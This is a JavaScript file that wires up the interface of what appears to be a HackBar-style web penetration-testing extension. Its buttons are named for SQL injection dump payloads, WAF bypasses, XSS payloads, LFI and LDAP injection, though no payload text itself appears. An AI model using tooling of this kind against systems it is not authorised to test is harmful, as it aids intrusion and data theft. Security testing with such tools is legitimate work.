// actions, modal controls, and user workflows are wired to these selectors.
var urlfield = document.getElementById("hackbar_urlfield");
var postdatafield = document.getElementById("hackbar_postdatafield");
var refererfield = document.getElementById("hackbar_refererfield");
var banner = document.getElementById('pBanner');
var inputText1 = document.getElementById('inputbox1');
var inputText2 = document.getElementById('inputbox2');
var inputText3 = document.getElementById('inputbox3');
var searchBox = document.getElementById("sbox");
var searchBox2 = document.getElementById("sbox2");
var searchBox3 = document.getElementById("sbox3");
var sboxBtn = document.getElementById('searchBtn');
var scloseBtn = document.getElementById('closeBtn');
var inputBox2 = document.getElementById('col2');
var inputBox3 = document.getElementById('col3');
var postResponseContainer = document.getElementById('hackbar-post-response');
var postResponseOutput = document.getElementById('hackbar-post-response-content');
var panelNotificationTimer = null;

// Use a local Semantic UI message for panel feedback. Empty content is ignored
// so callers can never create a blank notification.
function showPanelNotification(message) {
    var notificationText = typeof message === 'string' ? message.trim() : '';
    if (!notificationText) {
        return false;
    }

    var notification = document.getElementById('hackbar-notification');
    if (!notification) {
        notification = document.createElement('div');
        notification.id = 'hackbar-notification';
        notification.className = 'ui message hackbar-notification';
        notification.setAttribute('role', 'alert');
        notification.setAttribute('aria-live', 'assertive');
        notification.setAttribute('aria-atomic', 'true');
        document.body.appendChild(notification);
    }

    notification.textContent = notificationText;
    notification.hidden = false;
    window.clearTimeout(panelNotificationTimer);
    panelNotificationTimer = window.setTimeout(function () {
        notification.hidden = true;
    }, 4000);

    return true;
}

//================= post data toggle

var postdataCbx = document.getElementById("ui_postdata");
var refererCbx = document.getElementById("ui_referer");
var postdatacontainer = document.getElementById('ui_postdatacontainer');
var referercontainer = document.getElementById('ui_referercontainer');

//================ function 01 post data toggle {

function togglepostdata() {
    if (postdataCbx.checked) {
        postdatacontainer.style.display = "block";
    } else {
        postdatacontainer.style.display = "none";

    }
}

function togglereferer() {
    if (refererCbx.checked) {
        referercontainer.style.display = "block";

    } else {
        referercontainer.style.display = "none";

    }
}

postdataCbx.addEventListener('change', togglepostdata);
refererCbx.addEventListener('change', togglereferer);

//=============== function 01 post data toggle }

//=============== popup close
scloseBtn.addEventListener("click", popClose);


function popClose() {
    $('.ui.mini.modal').modal('hide');
    inputBox2.style.display = 'none';
    inputBox3.style.display = 'none';
}

//================  ui button

var loadurlBtn = document.getElementById('ui_loadurl');
var splitBtn = document.getElementById('ui_split');
var executeBtn = document.getElementById('ui_run');
var reverseBtn = document.getElementsByName("reverse")[0];
var b64encodeBtn = document.getElementsByName("base64encode")[0];
var b64decodeBtn = document.getElementsByName("base64decode")[0];
var urlencodeBtn = document.getElementsByName("urlencode")[0];
var urldecodeBtn = document.getElementsByName("urldecode")[0];
var md5hashBtn = document.getElementsByName("md5hash")[0];
var sha1hashBtn = document.getElementsByName("sha1hash")[0];
var sha256hashBtn = document.getElementsByName("sha256hash")[0];
var rot13Btn = document.getElementsByName("rot13")[0];

var hexdeBtn = document.getElementsByName("hexdecode")[0];
var hexenBtn = document.getElementsByName("hexencode")[0];
var xhexdeBtn = document.getElementsByName("xhexdecode")[0];
var xhexenBtn = document.getElementsByName("xhexencode")[0];

//=========== SQL Mysql section

var mysqlbasicinfoBtn = document.getElementsByName("mysqlbasicinfo")[0];
var unionBtn = document.getElementsByName("union")[0];
var unionnullBtn = document.getElementsByName("unionnull")[0];
var orderbyBtn = document.getElementsByName("orderby")[0];
var groupbyBtn = document.getElementsByName("groupby")[0];
var mysqlconvertutf8Btn = document.getElementsByName("mysqlconvertutf8")[0];
var mysqlconvertlatin1Btn = document.getElementsByName("mysqlconvertlatin1")[0];


//=========== SQL Database

var datadumpBtn = document.getElementsByName("datadump")[0];

//=========== SQL DIOS

var silentcoderBtn = document.getElementsByName("silentcoder")[0];
var madbloodBtn = document.getElementsByName("madblood")[0];
var tproBtn = document.getElementsByName("tpro")[0];
var z3r0Btn = document.getElementsByName("z3r0")[0];
var zenBtn = document.getElementsByName("zen")[0];
var makManBtn = document.getElementsByName("makMan")[0];
var tr0janBtn = document.getElementsByName("tr0jan")[0];
var madBtn = document.getElementsByName("mad")[0];
var madwafBtn = document.getElementsByName("madwaf")[0];
var benchmarkBtn = document.getElementsByName("benchmark")[0];
var rotBtn = document.getElementsByName("diosroot")[0];
var rummyBtn = document.getElementsByName("rummy")[0];
var ajkaroBtn = document.getElementsByName("ajkaro")[0];
var zenWAFBtn = document.getElementsByName("zenWAF")[0];
var wAFBtn = document.getElementsByName("wAF")[0];

//============== SQL Char

var mysqltosqlcharBtn = document.getElementsByName("mysqltosqlchar")[0];
var mssqltosqlcharBtn = document.getElementsByName("mssqltosqlchar")[0];
var oracletosqlcharBtn = document.getElementsByName("oracletosqlchar")[0];


//============== SQL single

var unionselectBtn = document.getElementsByName("unionselect")[0];
var spacestocommentsBtn = document.getElementsByName("spacestocomments")[0];

//============== error based

var errorbVBtn = document.getElementsByName("errorbVersion")[0];
var errorbDBtn = document.getElementsByName("errorbDatabase")[0];
var errorbTBtn = document.getElementsByName("errorbTable")[0];
var errorbCBtn = document.getElementsByName("errorbColumns")[0];
var errorbDaBtn = document.getElementsByName("errorbData")[0];

var polygonVBtn = document.getElementsByName("polygonVersion")[0];
var polygonTBtn = document.getElementsByName("polygonTable")[0];

var mpdiosBtn = document.getElementsByName("mpDios")[0];
var mpdios1Btn = document.getElementsByName("mpDios1")[0];
var mpdios2Btn = document.getElementsByName("mpDios2")[0];
var mpdios3Btn = document.getElementsByName("mpDios3")[0];

var aderrorVBtn = document.getElementsByName("aderrorV")[0];
var aderrorTBtn = document.getElementsByName("aderrorT")[0];

var mddiosBtn = document.getElementsByName("mddios")[0];
var mddios2Btn = document.getElementsByName("mddios2")[0];
var mddios3Btn = document.getElementsByName("mddios3")[0];
var mddios4Btn = document.getElementsByName("mddios4")[0];
var mddios5Btn = document.getElementsByName("mddios5")[0];
var mddios6Btn = document.getElementsByName("mddios6")[0];
var mddios7Btn = document.getElementsByName("mddios7")[0];
var mddios8Btn = document.getElementsByName("mddios8")[0];
var mddios9Btn = document.getElementsByName("mddios9")[0];

var dqbasedBtn = document.getElementsByName("dqbased")[0];
var dqbased2Btn = document.getElementsByName("dqbased2")[0];
var dqbased3Btn = document.getElementsByName("dqbased3")[0];
var dqbased4Btn = document.getElementsByName("dqbased4")[0];
var dqbased5Btn = document.getElementsByName("dqbased5")[0];

//================= waf

var waf1Btn = document.getElementsByName("waf1")[0];
var waf2Btn = document.getElementsByName("waf2")[0];
var waf3Btn = document.getElementsByName("waf3")[0];
var waf4Btn = document.getElementsByName("waf4")[0];

//================= xss

var stringtocharcodeBtn = document.getElementsByName("stringtocharcode")[0];
var stringtohtmlcharcodeBtn = document.getElementsByName("stringtohtmlcharcode")[0];
var xssalertBtn = document.getElementsByName("xssalert")[0];

//================= xss payload

var payload1Btn = document.getElementsByName("payload1")[0];
var payload2Btn = document.getElementsByName("payload2")[0];
var payload3Btn = document.getElementsByName("payload3")[0];
var payload4Btn = document.getElementsByName("payload4")[0];
var payload5Btn = document.getElementsByName("payload5")[0];
var payload6Btn = document.getElementsByName("payload6")[0];
var payload7Btn = document.getElementsByName("payload7")[0];
var payload8Btn = document.getElementsByName("payload8")[0];
var payload9Btn = document.getElementsByName("payload9")[0];
var payload10Btn = document.getElementsByName("payload10")[0];
var payload11Btn = document.getElementsByName("payload11")[0];
var payload12Btn = document.getElementsByName("payload12")[0];
var payload13Btn = document.getElementsByName("payload13")[0];
var payload14Btn = document.getElementsByName("payload14")[0];
var payload15Btn = document.getElementsByName("payload15")[0];
var payload16Btn = document.getElementsByName("payload16")[0];
var payload17Btn = document.getElementsByName("payload17")[0];
var payload18Btn = document.getElementsByName("payload18")[0];
var payload19Btn = document.getElementsByName("payload19")[0];
var payload20Btn = document.getElementsByName("payload20")[0];

//================ Lfi

var lfi1Btn = document.getElementsByName("lfi1")[0];
var lfi2Btn = document.getElementsByName("lfi2")[0];
var lfi3Btn = document.getElementsByName("lfi3")[0];
var lfi4Btn = document.getElementsByName("lfi4")[0];
var lfi5Btn = document.getElementsByName("lfi5")[0];
var lfi6Btn = document.getElementsByName("lfi6")[0];
var lfi7Btn = document.getElementsByName("lfi7")[0];
var lfi8Btn = document.getElementsByName("lfi8")[0];
var lfi9Btn = document.getElementsByName("lfi9")[0];
var lfi10Btn = document.getElementsByName("lfi10")[0];
var lfi11Btn = document.getElementsByName("lfi11")[0];
var lfi12Btn = document.getElementsByName("lfi12")[0];
var lfi13Btn = document.getElementsByName("lfi13")[0];
var lfi14Btn = document.getElementsByName("lfi14")[0];
var lfi15Btn = document.getElementsByName("lfi15")[0];
var lfi16Btn = document.getElementsByName("lfi16")[0];
var lfi17Btn = document.getElementsByName("lfi17")[0];
var lfi18Btn = document.getElementsByName("lfi18")[0];
var lfi19Btn = document.getElementsByName("lfi19")[0];
var lfi20Btn = document.getElementsByName("lfi20")[0];
var lfi21Btn = document.getElementsByName("lfi21")[0];
var lfi22Btn = document.getElementsByName("lfi22")[0];
var lfi23Btn = document.getElementsByName("lfi23")[0];
var lfi24Btn = document.getElementsByName("lfi24")[0];
var lfi25Btn = document.getElementsByName("lfi25")[0];
var lfi26Btn = document.getElementsByName("lfi26")[0];
var lfi27Btn = document.getElementsByName("lfi27")[0];
var lfi28Btn = document.getElementsByName("lfi28")[0];
var lfi29Btn = document.getElementsByName("lfi29")[0];
var lfi30Btn = document.getElementsByName("lfi30")[0];

//================= Pass code

var passBtn = document.getElementsByName("pass")[0];
var pass1Btn = document.getElementsByName("pass1")[0];
var pass2Btn = document.getElementsByName("pass2")[0];
var pass3Btn = document.getElementsByName("pass3")[0];
var pass4Btn = document.getElementsByName("pass4")[0];
var pass5Btn = document.getElementsByName("pass5")[0];
var pass6Btn = document.getElementsByName("pass6")[0];
var pass7Btn = document.getElementsByName("pass7")[0];
var pass8Btn = document.getElementsByName("pass8")[0];
var pass9Btn = document.getElementsByName("pass9")[0];
var pass10Btn = document.getElementsByName("pass10")[0];
var pass11Btn = document.getElementsByName("pass11")[0];
var pass12Btn = document.getElementsByName("pass12")[0];
var pass13Btn = document.getElementsByName("pass13")[0];
var pass14Btn = document.getElementsByName("pass14")[0];
var pass15Btn = document.getElementsByName("pass15")[0];
var pass16Btn = document.getElementsByName("pass16")[0];
var pass17Btn = document.getElementsByName("pass17")[0];
var pass18Btn = document.getElementsByName("pass18")[0];

//============= Others

var addslashesBtn = document.getElementsByName("addslashes")[0];
var stripslashesBtn = document.getElementsByName("stripslashes")[0];
var stripspacesBtn = document.getElementsByName("stripspaces")[0];

//======= plus
var plusBtn = document.getElementsByName("plus")[0];
var minusBtn = document.getElementsByName("minus")[0];

//======= bypasser
var dsubBtn = document.getElementsByName("dsub")[0];
var dsub2Btn = document.getElementsByName("dsub2")[0];
var dsub3Btn = document.getElementsByName("dsub3")[0];

//======== error fix
var bpassBtn = document.getElementsByName("bpass")[0];
var bpass1Btn = document.getElementsByName("bpass1")[0];
var bpass2Btn = document.getElementsByName("bpass2")[0];
var bpass3Btn = document.getElementsByName("bpass3")[0];
var bpass4Btn = document.getElementsByName("bpass4")[0];
var bpass5Btn = document.getElementsByName("bpass5")[0];
var bpass6Btn = document.getElementsByName("bpass6")[0];
var bpass7Btn = document.getElementsByName("bpass7")[0];
var bpass8Btn = document.getElementsByName("bpass8")[0];
var bpass9Btn = document.getElementsByName("bpass9")[0];

//==========waf order
var wafOrderBtn = document.getElementsByName("waforderBy")[0];
var wafOrder2Btn = document.getElementsByName("waforderBy2")[0];
var wafOrder3Btn = document.getElementsByName("waforderBy3")[0];
var wafOrder4Btn = document.getElementsByName("waforderBy4")[0];

//=============== waf union
var wafunionBtn = document.getElementsByName("wafunion")[0];
var wafunion2Btn = document.getElementsByName("wafunion2")[0];
var wafunion3Btn = document.getElementsByName("wafunion3")[0];
var wafunion4Btn = document.getElementsByName("wafunion4")[0];
var wafunion5Btn = document.getElementsByName("wafunion5")[0];
var wafunion6Btn = document.getElementsByName("wafunion6")[0];
var wafunion7Btn = document.getElementsByName("wafunion7")[0];
var wafunion8Btn = document.getElementsByName("wafunion8")[0];
var wafunion9Btn = document.getElementsByName("wafunion9")[0];
var wafunion10Btn = document.getElementsByName("wafunion10")[0];
var wafunion11Btn = document.getElementsByName("wafunion11")[0];
var wafunion12Btn = document.getElementsByName("wafunion12")[0];
var wafunion13Btn = document.getElementsByName("wafunion13")[0];

//=============== waf concat 
var wafconcatBtn = document.getElementsByName("wafconcat")[0];
var wafconcat2Btn = document.getElementsByName("wafconcat2")[0];
var wafconcat3Btn = document.getElementsByName("wafconcat3")[0];
var wafconcat4Btn = document.getElementsByName("wafconcat4")[0];
var wafconcat5Btn = document.getElementsByName("wafconcat5")[0];
//=============== waf number
var wafnumberBtn = document.getElementsByName("wafnumber")[0];
var wafnumber2Btn = document.getElementsByName("wafnumber2")[0];
var wafnumber3Btn = document.getElementsByName("wafnumber3")[0];
var wafnumber4Btn = document.getElementsByName("wafnumber4")[0];
//=============== waf shema
var wafshemaBtn = document.getElementsByName("wafshema")[0];
var wafshema2Btn = document.getElementsByName("wafshema2")[0];
var wafshema3Btn = document.getElementsByName("wafshema3")[0];
var wafshema4Btn = document.getElementsByName("wafshema4")[0];
var wafshema5Btn = document.getElementsByName("wafshema5")[0];
//=============== ldap
var ldap1Btn = document.getElementsByName("ldap1")[0];
var ldap2Btn = document.getElementsByName("ldap2")[0];
var ldap3Btn = document.getElementsByName("ldap3")[0];
var ldap4Btn = document.getElementsByName("ldap4")[0];
var ldap5Btn = document.getElementsByName("ldap5")[0];
var ldap6Btn = document.getElementsByName("ldap6")[0];
var ldap7Btn = document.getElementsByName("ldap7")[0];
var ldap8Btn = document.getElementsByName("ldap8")[0];
var ldap9Btn = document.getElementsByName("ldap9")[0];
var ldap10Btn = document.getElementsByName("ldap10")[0];
var ldap11Btn = document.getElementsByName("ldap11")[0];
var ldap12Btn = document.getElementsByName("ldap12")[0];
var ldap13Btn = document.getElementsByName("ldap13")[0];
var ldap14Btn = document.getElementsByName("ldap14")[0];
var ldap15Btn = document.getElementsByName("ldap15")[0];
var ldap16Btn = document.getElementsByName("ldap16")[0];
var ldap17Btn = document.getElementsByName("ldap17")[0];
var ldap18Btn = document.getElementsByName("ldap18")[0];
var ldap19Btn = document.getElementsByName("ldap19")[0];
var ldap20Btn = document.getElementsByName("ldap20")[0];
var ldap21Btn = document.getElementsByName("ldap21")[0];
var ldap22Btn = document.getElementsByName("ldap22")[0];
var ldap23Btn = document.getElementsByName("ldap23")[0];
//=========== variables
var variable1Btn = document.getElementsByName("variable1")[0];
var variable2Btn = document.getElementsByName("variable2")[0];
var variable3Btn = document.getElementsByName("variable3")[0];
var variable4Btn = document.getElementsByName("variable4")[0];
var variable5Btn = document.getElementsByName("variable5")[0];
var variable6Btn = document.getElementsByName("variable6")[0];
var variable7Btn = document.getElementsByName("variable7")[0];
var variable8Btn = document.getElementsByName("variable8")[0];
var variable9Btn = document.getElementsByName("variable9")[0];
var variable10Btn = document.getElementsByName("variable10")[0];
var variable11Btn = document.getElementsByName("variable11")[0];
var variable12Btn = document.getElementsByName("variable12")[0];
var variable13Btn = document.getElementsByName("variable13")[0];
var variable14Btn = document.getElementsByName("variable14")[0];
var variable15Btn = document.getElementsByName("variable15")[0];
var variable16Btn = document.getElementsByName("variable16")[0];
var variable17Btn = document.getElementsByName("variable17")[0];
var variable18Btn = document.getElementsByName("variable18")[0];
var variable19Btn = document.getElementsByName("variable19")[0];
var variable20Btn = document.getElementsByName("variable20")[0];
var variable21Btn = document.getElementsByName("variable21")[0];
var variable22Btn = document.getElementsByName("variable22")[0];
var variable23Btn = document.getElementsByName("variable23")[0];
var variable24Btn = document.getElementsByName("variable24")[0];
var variable25Btn = document.getElementsByName("variable25")[0];
var variable26Btn = document.getElementsByName("variable26")[0];
var variable27Btn = document.getElementsByName("variable27")[0];
var variable28Btn = document.getElementsByName("variable28")[0];
var variable29Btn = document.getElementsByName("variable29")[0];
var variable30Btn = document.getElementsByName("variable30")[0];
var variable31Btn = document.getElementsByName("variable31")[0];
var variable32Btn = document.getElementsByName("variable32")[0];
var variable33Btn = document.getElementsByName("variable33")[0];
var variable34Btn = document.getElementsByName("variable34")[0];
var variable35Btn = document.getElementsByName("variable35")[0];
var variable36Btn = document.getElementsByName("variable36")[0];
//=======================================
var currentFocusField = null;

urlfield.focus();
currentFocusField = urlfield;
var toolMenuClickHandler = function (event) {
    onClickMenu(event);
};

var focusedFieldHandler = function (event) {
    onFieldFocus(event);
};

//=======================================
urlfield.addEventListener('focus', focusedFieldHandler, false);
postdatafield.addEventListener('focus', focusedFieldHandler, false);
refererfield.addEventListener('focus', focusedFieldHandler, false);
urlfield.addEventListener('click', onFieldClick, false);
postdatafield.addEventListener('click', onFieldClick, false);
refererfield.addEventListener('click', onFieldClick, false);

reverseBtn.addEventListener('click', toolMenuClickHandler, false);
b64encodeBtn.addEventListener('click', toolMenuClickHandler, false);
b64decodeBtn.addEventListener('click', toolMenuClickHandler, false);
urlencodeBtn.addEventListener('click', toolMenuClickHandler, false);
urldecodeBtn.addEventListener('click', toolMenuClickHandler, false);
md5hashBtn.addEventListener('click', toolMenuClickHandler, false);
sha1hashBtn.addEventListener('click', toolMenuClickHandler, false);
sha256hashBtn.addEventListener('click', toolMenuClickHandler, false);
rot13Btn.addEventListener('click', toolMenuClickHandler, false);

hexdeBtn.addEventListener('click', toolMenuClickHandler, false);
hexenBtn.addEventListener('click', toolMenuClickHandler, false);
xhexdeBtn.addEventListener('click', toolMenuClickHandler, false);
xhexenBtn.addEventListener('click', toolMenuClickHandler, false);

mysqlbasicinfoBtn.addEventListener('click', toolMenuClickHandler, false);
unionBtn.addEventListener('click', toolMenuClickHandler, false);
unionnullBtn.addEventListener('click', toolMenuClickHandler, false);
orderbyBtn.addEventListener('click', toolMenuClickHandler, false);
groupbyBtn.addEventListener('click', toolMenuClickHandler, false);
mysqlconvertutf8Btn.addEventListener('click', toolMenuClickHandler, false);
mysqlconvertlatin1Btn.addEventListener('click', toolMenuClickHandler, false);

datadumpBtn.addEventListener('click', toolMenuClickHandler, false);

silentcoderBtn.addEventListener('click', toolMenuClickHandler, false);
madbloodBtn.addEventListener('click', toolMenuClickHandler, false);
tproBtn.addEventListener('click', toolMenuClickHandler, false);
z3r0Btn.addEventListener('click', toolMenuClickHandler, false);
zenBtn.addEventListener('click', toolMenuClickHandler, false);
makManBtn.addEventListener('click', toolMenuClickHandler, false);
tr0janBtn.addEventListener('click', toolMenuClickHandler, false);
madBtn.addEventListener('click', toolMenuClickHandler, false);
madwafBtn.addEventListener('click', toolMenuClickHandler, false);
benchmarkBtn.addEventListener('click', toolMenuClickHandler, false);
rotBtn.addEventListener('click', toolMenuClickHandler, false);
rummyBtn.addEventListener('click', toolMenuClickHandler, false);
ajkaroBtn.addEventListener('click', toolMenuClickHandler, false);
zenWAFBtn.addEventListener('click', toolMenuClickHandler, false);
wAFBtn.addEventListener('click', toolMenuClickHandler, false);

mysqltosqlcharBtn.addEventListener('click', toolMenuClickHandler, false);
mssqltosqlcharBtn.addEventListener('click', toolMenuClickHandler, false);
oracletosqlcharBtn.addEventListener('click', toolMenuClickHandler, false);

unionselectBtn.addEventListener('click', toolMenuClickHandler, false);
spacestocommentsBtn.addEventListener('click', toolMenuClickHandler, false);

loadurlBtn.addEventListener("click", loadUrl, false);
splitBtn.addEventListener('click', splitUrl);
executeBtn.addEventListener('click', execute);

errorbVBtn.addEventListener('click', toolMenuClickHandler, false);
errorbDBtn.addEventListener('click', toolMenuClickHandler, false);
errorbTBtn.addEventListener('click', toolMenuClickHandler, false);
errorbCBtn.addEventListener('click', toolMenuClickHandler, false);
errorbDaBtn.addEventListener('click', toolMenuClickHandler, false);


polygonVBtn.addEventListener('click', toolMenuClickHandler, false);
polygonTBtn.addEventListener('click', toolMenuClickHandler, false);


mpdiosBtn.addEventListener('click', toolMenuClickHandler, false);
mpdios1Btn.addEventListener('click', toolMenuClickHandler, false);
mpdios2Btn.addEventListener('click', toolMenuClickHandler, false);
mpdios3Btn.addEventListener('click', toolMenuClickHandler, false);

aderrorVBtn.addEventListener('click', toolMenuClickHandler, false);
aderrorTBtn.addEventListener('click', toolMenuClickHandler, false);


mddiosBtn.addEventListener('click', toolMenuClickHandler, false);
mddios2Btn.addEventListener('click', toolMenuClickHandler, false);
mddios3Btn.addEventListener('click', toolMenuClickHandler, false);
mddios4Btn.addEventListener('click', toolMenuClickHandler, false);
mddios5Btn.addEventListener('click', toolMenuClickHandler, false);
mddios6Btn.addEventListener('click', toolMenuClickHandler, false);
mddios7Btn.addEventListener('click', toolMenuClickHandler, false);
mddios8Btn.addEventListener('click', toolMenuClickHandler, false);
mddios9Btn.addEventListener('click', toolMenuClickHandler, false);

dqbasedBtn.addEventListener('click', toolMenuClickHandler, false);
dqbased2Btn.addEventListener('click', toolMenuClickHandler, false);
dqbased3Btn.addEventListener('click', toolMenuClickHandler, false);
dqbased4Btn.addEventListener('click', toolMenuClickHandler, false);
dqbased5Btn.addEventListener('click', toolMenuClickHandler, false);

waf1Btn.addEventListener('click', toolMenuClickHandler, false);
waf2Btn.addEventListener('click', toolMenuClickHandler, false);
waf3Btn.addEventListener('click', toolMenuClickHandler, false);
waf4Btn.addEventListener('click', toolMenuClickHandler, false);

stringtocharcodeBtn.addEventListener('click', toolMenuClickHandler, false);
stringtohtmlcharcodeBtn.addEventListener('click', toolMenuClickHandler, false);
xssalertBtn.addEventListener('click', toolMenuClickHandler, false);

payload1Btn.addEventListener('click', toolMenuClickHandler, false);
payload2Btn.addEventListener('click', toolMenuClickHandler, false);
payload3Btn.addEventListener('click', toolMenuClickHandler, false);
payload4Btn.addEventListener('click', toolMenuClickHandler, false);
payload5Btn.addEventListener('click', toolMenuClickHandler, false);
payload6Btn.addEventListener('click', toolMenuClickHandler, false);
payload7Btn.addEventListener('click', toolMenuClickHandler, false);
payload8Btn.addEventListener('click', toolMenuClickHandler, false);
payload9Btn.addEventListener('click', toolMenuClickHandler, false);
payload10Btn.addEventListener('click', toolMenuClickHandler, false);
payload11Btn.addEventListener('click', toolMenuClickHandler, false);
payload12Btn.addEventListener('click', toolMenuClickHandler, false);
payload13Btn.addEventListener('click', toolMenuClickHandler, false);
payload14Btn.addEventListener('click', toolMenuClickHandler, false);
payload15Btn.addEventListener('click', toolMenuClickHandler, false);
payload16Btn.addEventListener('click', toolMenuClickHandler, false);
payload17Btn.addEventListener('click', toolMenuClickHandler, false);
payload18Btn.addEventListener('click', toolMenuClickHandler, false);
payload19Btn.addEventListener('click', toolMenuClickHandler, false);
payload20Btn.addEventListener('click', toolMenuClickHandler, false);

lfi1Btn.addEventListener('click', toolMenuClickHandler, false);
lfi2Btn.addEventListener('click', toolMenuClickHandler, false);
lfi3Btn.addEventListener('click', toolMenuClickHandler, false);
lfi4Btn.addEventListener('click', toolMenuClickHandler, false);
lfi5Btn.addEventListener('click', toolMenuClickHandler, false);
lfi6Btn.addEventListener('click', toolMenuClickHandler, false);
lfi7Btn.addEventListener('click', toolMenuClickHandler, false);
lfi8Btn.addEventListener('click', toolMenuClickHandler, false);
lfi9Btn.addEventListener('click', toolMenuClickHandler, false);
lfi10Btn.addEventListener('click', toolMenuClickHandler, false);
lfi11Btn.addEventListener('click', toolMenuClickHandler, false);
lfi12Btn.addEventListener('click', toolMenuClickHandler, false);
lfi13Btn.addEventListener('click', toolMenuClickHandler, false);
lfi14Btn.addEventListener('click', toolMenuClickHandler, false);
lfi15Btn.addEventListener('click', toolMenuClickHandler, false);
lfi16Btn.addEventListener('click', toolMenuClickHandler, false);
lfi17Btn.addEventListener('click', toolMenuClickHandler, false);
lfi18Btn.addEventListener('click', toolMenuClickHandler, false);
lfi19Btn.addEventListener('click', toolMenuClickHandler, false);
lfi20Btn.addEventListener('click', toolMenuClickHandler, false);
lfi21Btn.addEventListener('click', toolMenuClickHandler, false);
lfi22Btn.addEventListener('click', toolMenuClickHandler, false);
lfi23Btn.addEventListener('click', toolMenuClickHandler, false);
lfi24Btn.addEventListener('click', toolMenuClickHandler, false);
lfi25Btn.addEventListener('click', toolMenuClickHandler, false);
lfi26Btn.addEventListener('click', toolMenuClickHandler, false);
lfi27Btn.addEventListener('click', toolMenuClickHandler, false);
lfi28Btn.addEventListener('click', toolMenuClickHandler, false);
lfi29Btn.addEventListener('click', toolMenuClickHandler, false);
lfi30Btn.addEventListener('click', toolMenuClickHandler, false);


passBtn.addEventListener('click', toolMenuClickHandler, false);
pass1Btn.addEventListener('click', toolMenuClickHandler, false);
pass2Btn.addEventListener('click', toolMenuClickHandler, false);
pass3Btn.addEventListener('click', toolMenuClickHandler, false);
pass4Btn.addEventListener('click', toolMenuClickHandler, false);
pass5Btn.addEventListener('click', toolMenuClickHandler, false);
pass6Btn.addEventListener('click', toolMenuClickHandler, false);
pass7Btn.addEventListener('click', toolMenuClickHandler, false);
pass8Btn.addEventListener('click', toolMenuClickHandler, false);
pass9Btn.addEventListener('click', toolMenuClickHandler, false);
pass10Btn.addEventListener('click', toolMenuClickHandler, false);
pass11Btn.addEventListener('click', toolMenuClickHandler, false);
pass12Btn.addEventListener('click', toolMenuClickHandler, false);
pass13Btn.addEventListener('click', toolMenuClickHandler, false);
pass14Btn.addEventListener('click', toolMenuClickHandler, false);
pass15Btn.addEventListener('click', toolMenuClickHandler, false);
pass16Btn.addEventListener('click', toolMenuClickHandler, false);
pass17Btn.addEventListener('click', toolMenuClickHandler, false);
pass18Btn.addEventListener('click', toolMenuClickHandler, false);

sboxBtn.addEventListener('click', toolMenuClickHandler, false);
addslashesBtn.addEventListener('click', toolMenuClickHandler, false);
stripslashesBtn.addEventListener('click', toolMenuClickHandler, false);
stripspacesBtn.addEventListener('click', toolMenuClickHandler, false);

plusBtn.addEventListener('click', toolMenuClickHandler, false);
minusBtn.addEventListener('click', toolMenuClickHandler, false);

dsubBtn.addEventListener('click', toolMenuClickHandler, false);
dsub2Btn.addEventListener('click', toolMenuClickHandler, false);
dsub3Btn.addEventListener('click', toolMenuClickHandler, false);

bpassBtn.addEventListener('click', toolMenuClickHandler, false);
bpass1Btn.addEventListener('click', toolMenuClickHandler, false);
bpass2Btn.addEventListener('click', toolMenuClickHandler, false);
bpass3Btn.addEventListener('click', toolMenuClickHandler, false);
bpass4Btn.addEventListener('click', toolMenuClickHandler, false);
bpass5Btn.addEventListener('click', toolMenuClickHandler, false);
bpass6Btn.addEventListener('click', toolMenuClickHandler, false);
bpass7Btn.addEventListener('click', toolMenuClickHandler, false);
bpass8Btn.addEventListener('click', toolMenuClickHandler, false);
bpass9Btn.addEventListener('click', toolMenuClickHandler, false);

wafOrderBtn.addEventListener('click', toolMenuClickHandler, false);
wafOrder2Btn.addEventListener('click', toolMenuClickHandler, false);
wafOrder3Btn.addEventListener('click', toolMenuClickHandler, false);
wafOrder4Btn.addEventListener('click', toolMenuClickHandler, false);


wafunionBtn.addEventListener('click', toolMenuClickHandler, false);
wafunion2Btn.addEventListener('click', toolMenuClickHandler, false);
wafunion3Btn.addEventListener('click', toolMenuClickHandler, false);
wafunion4Btn.addEventListener('click', toolMenuClickHandler, false);
wafunion5Btn.addEventListener('click', toolMenuClickHandler, false);
wafunion6Btn.addEventListener('click', toolMenuClickHandler, false);
wafunion7Btn.addEventListener('click', toolMenuClickHandler, false);
wafunion8Btn.addEventListener('click', toolMenuClickHandler, false);
wafunion9Btn.addEventListener('click', toolMenuClickHandler, false);
wafunion10Btn.addEventListener('click', toolMenuClickHandler, false);
wafunion11Btn.addEventListener('click', toolMenuClickHandler, false);
wafunion12Btn.addEventListener('click', toolMenuClickHandler, false);
wafunion13Btn.addEventListener('click', toolMenuClickHandler, false);

wafconcatBtn.addEventListener('click', toolMenuClickHandler, false);
wafconcat2Btn.addEventListener('click', toolMenuClickHandler, false);
wafconcat3Btn.addEventListener('click', toolMenuClickHandler, false);
wafconcat4Btn.addEventListener('click', toolMenuClickHandler, false);
wafconcat5Btn.addEventListener('click', toolMenuClickHandler, false);

wafnumberBtn.addEventListener('click', toolMenuClickHandler, false);
wafnumber2Btn.addEventListener('click', toolMenuClickHandler, false);
wafnumber3Btn.addEventListener('click', toolMenuClickHandler, false);
wafnumber4Btn.addEventListener('click', toolMenuClickHandler, false);

wafshemaBtn.addEventListener('click', toolMenuClickHandler, false);
wafshema2Btn.addEventListener('click', toolMenuClickHandler, false);
wafshema3Btn.addEventListener('click', toolMenuClickHandler, false);
wafshema4Btn.addEventListener('click', toolMenuClickHandler, false);
wafshema5Btn.addEventListener('click', toolMenuClickHandler, false);

ldap1Btn.addEventListener('click', toolMenuClickHandler, false);
ldap2Btn.addEventListener('click', toolMenuClickHandler, false);
ldap3Btn.addEventListener('click', toolMenuClickHandler, false);
ldap4Btn.addEventListener('click', toolMenuClickHandler, false);
ldap5Btn.addEventListener('click', toolMenuClickHandler, false);
ldap6Btn.addEventListener('click', toolMenuClickHandler, false);
ldap7Btn.addEventListener('click', toolMenuClickHandler, false);
ldap8Btn.addEventListener('click', toolMenuClickHandler, false);
ldap9Btn.addEventListener('click', toolMenuClickHandler, false);
ldap10Btn.addEventListener('click', toolMenuClickHandler, false);
ldap11Btn.addEventListener('click', toolMenuClickHandler, false);
ldap12Btn.addEventListener('click', toolMenuClickHandler, false);
ldap13Btn.addEventListener('click', toolMenuClickHandler, false);
ldap14Btn.addEventListener('click', toolMenuClickHandler, false);
ldap15Btn.addEventListener('click', toolMenuClickHandler, false);
ldap16Btn.addEventListener('click', toolMenuClickHandler, false);
ldap17Btn.addEventListener('click', toolMenuClickHandler, false);
ldap18Btn.addEventListener('click', toolMenuClickHandler, false);
ldap19Btn.addEventListener('click', toolMenuClickHandler, false);
ldap20Btn.addEventListener('click', toolMenuClickHandler, false);
